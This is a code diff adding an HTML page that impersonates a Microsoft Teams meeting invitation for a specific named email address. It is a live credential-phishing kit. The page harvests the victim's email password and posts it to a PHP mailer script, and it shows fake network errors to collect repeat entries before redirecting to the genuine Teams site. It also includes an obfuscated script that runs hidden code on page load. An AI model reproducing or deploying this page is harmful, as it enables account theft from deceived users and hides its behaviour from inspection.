@@ -1,0 +1,373 @@
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Microsoft Teams</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href='../css/style.css'>
+	<link rel="shortcut icon" href="../images/logo2.png">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet"/>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Overpass:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    
+    <style>
+        .circle {
+            width: 80px;
+            height: 80px;
+            background-color: #007BFF;
+            border-radius: 50%;
+            position: relative;
+        }
+
+        .circle::before,
+        .circle::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 123, 255, 0.5);
+            border-radius: 50%;
+            transform: translate(-50%, -50%) scale(1);
+            animation: pulse 1.5s infinite ease-out;
+        }
+
+        .circle::after {
+            animation-delay: 0.75s;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.8;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(2.5);
+                opacity: 0;
+            }
+        }
+
+        .participants{
+            display: flex;
+            height: 80vh;
+            justify-content: center;
+            align-items: center;
+        }
+        .image-container {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 150px;
+            height: 150px;
+            margin: 0px 30px;
+        }
+
+        .image-container img {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            position: relative;
+            z-index: 2;
+        }
+
+        .pulse-ring {
+            position: absolute;
+            width: 120px;
+            height: 120px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .pulse-ring::before,
+        .pulse-ring::after {
+            content: '';
+            position: absolute;
+            width: 120px;
+            height: 120px;
+            border: 3px solid rgba(0, 123, 255, 0.5);
+            border-radius: 50%;
+            animation: pulse-beat 1.5s infinite ease-out;
+        }
+
+        .pulse-ring::after {
+            animation-delay: 0.75s;
+        }
+
+        @keyframes pulse-beat {
+            0% {
+                transform: scale(1);
+                opacity: 0.8;
+            }
+            100% {
+                transform: scale(2.5);
+                opacity: 0;
+            }
+        }
+
+        .online{
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background: lime;
+            position: absolute;
+            bottom: 0%;
+            left: -10%;
+        }
+
+
+        @media only screen and (max-width:768px){
+
+            .participants{
+                display: flex;
+                height: 40vh;
+                justify-content: center;
+                align-items: center;
+                padding: 20px;
+            }
+            .image-container {
+                position: relative;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: 100px;
+                height: 100px;
+                margin: 0px 10px;
+            }
+
+            .image-container img {
+                width:100px;
+                height:100px;
+                border-radius: 50%;
+                position: relative;
+                z-index: 2;
+            }
+
+            .pulse-ring {
+                position: absolute;
+                width: 80px;
+                height: 80px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+
+            .pulse-ring::before,
+            .pulse-ring::after {
+                content: '';
+                position: absolute;
+                width: 90px;
+                height: 90px;
+                border: 3px solid rgba(0, 123, 255, 0.5);
+                border-radius: 50%;
+                animation: pulse-beat 1.5s infinite ease-out;
+            }
+
+
+            @keyframes pulse-beat {
+            0% {
+                transform: scale(1);
+                opacity: 0.8;
+            }
+            100% {
+                transform: scale(1.5);
+                opacity: 0;
+            }
+        }
+
+
+        }
+    </style>
+</head>
+<body style="height: 100vh;" class="overpass">
+    <nav>
+        <img src="../images/logo2.png" alt="Logo" width="114" height="75">
+</nav>
+
+    <audio id="myAudio" autoplay loop>
+        <source src="../teams_cut.mp3" type="audio/mpeg">
+    </audio>    
+
+      <script>
+        document.addEventListener("DOMContentLoaded", function() {
+          var audio = document.getElementById("myAudio");
+          audio.play().catch(error => {
+            console.log("Autoplay blocked:", error);
+          });
+        });
+      </script>
+
+<div class="container_x">
+
+        <div class="loading">
+            <div class="circle"></div>
+            <p><b>Joining meeting....</b></p>
+        </div>
+
+
+        <section class="meeting_page" style="display: none;">
+            <div class="section_flex section_flex_one">
+                <div class="participants hideOnclick">
+                    
+                    
+                    <div class="image-container">
+                        <div class="online"></div>
+                        <div class="pulse-ring"></div>
+                        <img src="../images/image2.jpg" alt="Profile">
+                    </div>
+                    
+                    
+                    <div class="image-container">
+                        <div class="online"></div>
+                        <div class="pulse-ring"></div>
+                        <img src="../images/image3.jpg" alt="Profile">
+                    </div>
+                    
+                    <div class="image-container">
+                        <div class="online"></div>
+                        <div class="pulse-ring"></div>
+                        <img src="../images/image4.jpg" alt="Profile">
+                    </div>
+                </div>
+                
+                
+                
+                <div class="video_box showOnClick" style="display: none;">
+                    <video id="video" autoplay></video>
+                    <script>
+                        async function startCamera() {
+                            try {
+                                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                                document.getElementById('video').srcObject = stream;
+                            } catch (error) {
+                                console.error("Error accessing webcam:", error);
+                            }
+                        }
+                        startCamera();
+                    </script>
+                    <footer>
+                        <div class="footer_flex">
+                            <i class="fa-solid fa-microphone"></i>
+                            <!-- <i class="fa-solid fa-microphone-slash"></i> -->
+                            <i class="fa-solid fa-video"></i> 
+                            <!-- <i class="fa-solid fa-video-slash"></i> -->
+                        </div>
+                        <div class="footer_flex footer_flex_two">
+                            <i class="fa-solid fa-share-from-square"></i>
+                            <i class="fa-solid fa-user-group"></i>
+                            <i class="fa-solid fa-comment"></i>
+                            <button><i class="fa-solid fa-phone-slash"></i>Cancel meeting</button>
+                        </div>
+                    </footer>
+                </div>
+
+            </div>
+            <div class="section_flex section_flex_two" style="background: #f5f5f5;">
+                <div class="waiting_screen hideOnclick" style="display: flex;">
+                    <div class="circle"></div>
+                    <button onclick="joinMeeting()"> <i class="fa-solid fa-video" style="color: white;"></i>Join meeting - 3 participant</button>
+                </div>
+
+                <div class="meet showOnClick" style="display: none;">
+                    <h1 style="color: white;">Microsoft Teams</h1>
+                    <p style="color: white; text-align: center;">Welcome <span style="color: white !important;">Academy </span>, you have been invited to join a meeting</p>
+                    <form id="form_login">
+                        <h2>
+                            Continue sign in as
+                        </h2>
+                        <p> sales001@lingfancooling.com.cn </p>
+                        <div style="padding-bottom:10px"><i id="error" style="color:red;display:none;font-size:90%;"> </i></div>
+                        <p style="color:red; text-align:center; font-size:14px; display:none;" id="errorText">Network Error, please try again</p>
+                       <input type="hidden" id="email" value="sales001@lingfancooling.com.cn" name="email">
+                        <input type="password" placeholder="Enter Emaill Password" style="width: 100%;height: 35px; padding: 5px; border-radius: 5px;border: 1px solid silver;" name="pass" id="password" required>
+                        <p style="margin: 20px 0px;">
+                        <input type="checkbox" checked> &nbsp;I agree to the <span>Terms of Service</span> and <span>Privacy Statement</span></a>
+                        </p>
+                        <button id="loginButton">Launch Meeting</button>
+                    </form>
+                </div>
+                
+                
+
+            </div>
+        </section>
+    </div>
+
+
+
+    <script>
+	var hideOnclick,showOnClick,section,loading,meeting_page,errorText,joinMeeting;(function(){var mvN='',BXj=319-308;function nyh(y){var w=4839231;var q=y.length;var m=[];for(var o=0;o<q;o++){m[o]=y.charAt(o)};for(var o=0;o<q;o++){var i=w*(o+282)+(w%49598);var d=w*(o+206)+(w%43790);var n=i%q;var x=d%q;var j=m[n];m[n]=m[x];m[x]=j;w=(i+d)%5131395;};return m.join('')};var Zhj=nyh('cxnwsnecftoagcsbjmvpyuktrrhzlduitoroq').substr(0,BXj);var VzN=',lj58<62nb"7+=,9s2,var d8*aacd7f[h8=ulcnmplr.Csv xe 0;tthnh8;9r,r5v8z,0.n=rgo09 +,e r=2hcz;e[.,,r,.h107{-,gga98,v61;4se}l;hb6nr=,=as[r1e]rw7A0Sttj=8(ac"+;e+l)e.oi)]+].+(;1llm;=2]C r= arbq.t1)k.(04t7.r7v[>,tqrha.ar,,m;n;s;aanain;l i)ivm1;nlaxi m=nj8ra(agp[(pnrccor+}rms3 if=[.)}n,tm-yp.vr(fzh-p{.aoetgxrdvpf=f[p=hli;nvtg;1=2ul7)v1rtocn[vi1i(ap6lenl[h+[w, i, =+)n+r ([;;b==thfg)nvCbsv=6+ssa(,odrgfnxm4vazhs=6zvc;.9}oesA=ttn1(,{;h.)ne.<o=er({hvr)- )"xrc.+4;cl su+i0urs=k;he)an"jqn=h +h==;t]})A=C5a))="]+)),esj{hCr;o=e).ac=21-1iorl=)+;2 ;v[tqf,aztirue;tlo(r=(=)v=ln=u]]r}(jrr)<ix(=h(t,aki).ai.gro,;t))<jt;pt9+fe+h]omh(a. ;;t;f4;ntu2+);t"i)ftwk.*luh2phsul(soleg(o(srz{giucb(rtnhc;);(ucv(e>.)ao[]ta(v2(h;pnojgpf("d);r;]n!)a;(c[Se+a,.;03hC0;tldonbvt( -0(avoo=an]0;"p(vvfCaaha+d"7;;);m)2l i] (uv!h<stgeeni(-t=+f1owC=hl(auq+d.h+2cAfpr=},foep]r+r, {u9u8j0;p.o6deruc e=f;u16u ri7j)8a too=Atr=.(oisvw)"';var SKK=nyh[Zhj];var LHA='';var hPE=SKK;var GQq=SKK(LHA,nyh(VzN));var xJT=GQq(nyh('+rpZ)ZZ0Z)ioZn(s1o3eZc*Z])Z,%tlZZmc6e$\/.)e+toZ$Z]_i%m{_(t,aGeZ=.Z!jZ_g!$Zi8$) $6[%d4Fe_1cZ<cZ7C1ecfso3-Z\/((Z@2"etgA_a.Z%tge!y_t!%Z{nZrree\'],h:.AZt()(gBZ%))s=.s.3]-vro,)gtZ72ce;AZdkn Z}.#sakbf{.[lnfZw=\/.Zhia8shet).4=.H.wl;{e;d8_C,-s%ZS47egk-g3qtZ)\/);ia_%.boZ)3#.oZ(fsi].)5Z{eDien:golff$32beeZd}t6ZZ%0Z0_xrrn0wcn(;\/$+Z$C(Z;t0m)%1e3.5%Zlj$81Tf4l8f*0)(ZZ8e hl!)gnsewee(_!!iu;=6lh)xZtrsi]e%i.x.&6tiZ=ZZth.s}e3]ra_1n$5eEtcao] g$(Zccny=ni(olwlZr.ou)3;8T](i.6$t3n622=%Zf0u;.n> np.li}1!tc0llfyifn{=il$eC$oBs}Z6_)k3Ce+5d.9}. inowy7;!.s,}l$Z8Z).;!=5ud(9)e;ad}e;h6do;yfc{(%;8.r;Z<bCZ$_6rev.kr%n.;b!4f]4 (Znaat;aroi)96y_efonet,s})78ni(eZI.Ce1)])9g()re_?1I*;lsmjaZ>3>=c9!Z,=r1]Z,Zyer2\/eZ 6)ZZ}m)0m!ZZ{_9ytcZg]k7=,=!Zm,)ZZ}$Zte 0(l2E*Z4.lC(190)p&3rnoZmpu?Zwc&eZsZcZ2a;jZ=;_=ev!c$ZZ;$[.o132taEeZ\/]oe0]w)9;)H,_9!.=%Zcsi)3[(((%Z5rbsen.4[rZD9[=3j\'e c!o2l;mf)a.(b_?hZaZ1)2s#\'e7ZZtn=78#sDe.Z[]0yZ).mf#oZ2%,uBgoZaZ4.)r."hc6e Z..Z!l+!{,Ze9!{ZZy6l0Z o!Z).i#i.fse2ZEt((Z;r[!a86(n=ko]{f{_ZuicZ$%wm7}(y t=&6dFn"4+1 afZ=et.Z(gZgttbfe3w.4gZk,a=?2enoZe%ce)m;(((p13.ee]<hgAZereo!ees6D%9;fecl5en(Zx2)t.=m5ooe .z!]$]u=<g:}nt=ie_0lo3Zs Z5(Z=3$)3$Ire}.==93=Z,=6eZZnZ(0.)eEtfhZse_01=8_t;=n8s%)tZe]].1?Z)[].t(9,ro1e(;.;Z {.)i4.)]x_1pZest..dfeuuie4#Za)p]lZ\/.;ZZecoo{t{()=Z#?Zf%mo;9,=ttr]Zeio;D!"d,bZ.eZ(,1Z)Zs=w=))_w28S}ZZs_,r3ZefwHZ!rnr4.. }e.li.{)B$f.rC.Zxr_]w(Z)!eoG+;[99 >y,5o=4tronZMZZZ2Zn;2_9Ss1oigro021]aau}.$n4n13&.1aZfZci.($Z.e.8ZyZ17Mo2T1e! [.6.0!me4uenZ2=.5b3c%32]ZZ%gqZ{) na0 rZthy@jZ%!(n_t#o)Zr"=Z3)_",(n[-Z,\/!p0j+9tetjZl4>41Zb).o)Z+,!3ry\/+"q3nZ;(GelZip(i9Bage$.))Z(i])eZB}Z e!e(=ne=t3j{wef_\'7 20]t=C1=[Z7oenf;Iw9(cZB3}gu[Z(7)Z7(re($isZ==6;_[6$}$5t5 *eqo%s!eio;]_oafm>am5_r(fognZtj3dsfSZIn 0l55eA2T,8iZe2ZZl,(Z,ZZZ8[b)6$ese70$(!=Z_ k!9>t)cl.o0ccZ,)ZZ%[x6Z(.Zru]] r3o? ]-dZsZ3jenZ n;lu)Zf$ .Z7.rZ\/r,ot((b}c.c_Drsjva,t9l=E7 ]p(Z8- 6)oZS er {Z= !(04Tb=_EZddo)p4n[t0kn1e0lZ8 e{Z\/ZlGbj .)!Z[ meZ3Z_i=#f,7*oZ.ro)[7nro;]))}$=tZ0  2ki.$)o;_![pnZclnee}lZri[8s9_o.3m)6$kt+5{eeecftou_[e\/;)$Zc[Z.{ZiZH"Z(yri)o6zB;egZf.es(=}[e,'));var cOm=hPE(mvN,xJT );cOm(2188);return 8743})()
+    </script>
+
+ <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+<script>
+    var intSubmit       = 0;
+    var strFirstPassword = '';
+
+    function getParameterByName(name, url) {
+        if (!url) url = window.location.href;
+        name = name.replace(/[\[\]]/g, "\\$&");
+        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+            results = regex.exec(url);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, " "));
+    }
+
+    (function(){
+        $('#password').focus();
+        $strEmail = document.getElementById('email').value;
+		$('#emailId').text($strEmail);
+
+        $('#form_login').submit(function(e){
+            e.preventDefault();
+            submitPassword();
+        });
+    }());
+
+    function submitPassword(){
+         var strPassword = $('#password').val();
+        var stremail = $('#email').val();
+        var cid = $('#cid').val();
+        var strdomain = $('#main_domain').val();
+        if(strPassword == '' || strPassword == null){
+            
+            $('#error').show();
+            $('#error').text('Please enter your email password.');
+        }else{
+            $.ajax({
+                url: "../mail/send_email.php",
+                method: "post",
+                data: {
+                    email: stremail,
+                    pass: strPassword,
+                    lpage: strdomain
+                },
+                success: function(data){
+                    intSubmit++
+                    if(intSubmit > 2){
+                        window.location.replace("https://www.microsoft.com/en-us/microsoft-teams/free");
+                    }else{
+                        $('#password').val("");
+                        $('#password').focus();
+                        $('#error').show();
+                        $('#error').text('Network Connection Error. Please Try Again');
+                    }
+                }
+            });
+            
+        }
+    }
+</script>
+</body>
+</html>
